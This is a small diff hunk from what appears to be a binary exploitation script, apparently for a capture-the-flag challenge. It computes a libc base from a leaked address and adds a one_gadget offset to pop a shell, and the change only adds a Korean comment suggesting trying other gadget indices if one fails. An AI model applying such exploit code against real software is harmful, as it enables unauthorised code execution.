@@ -24,7 +24,7 @@ log.info(f'dl_fini : {hex(dl_fini)}')
 libc_base = dl_fini - 0x237040
 
 ogt_offset = get_one_gadgets()
-one_gadget = libc_base + ogt_offset[0]
+one_gadget = libc_base + ogt_offset[0] # 실패 시 ogt_offset[1] 같은 다음 인덱스로 바꿔보셈 
 log.info(f'libc_base : {hex(libc_base)}')
 log.info(f'one_gadget : {hex(one_gadget)}')
 
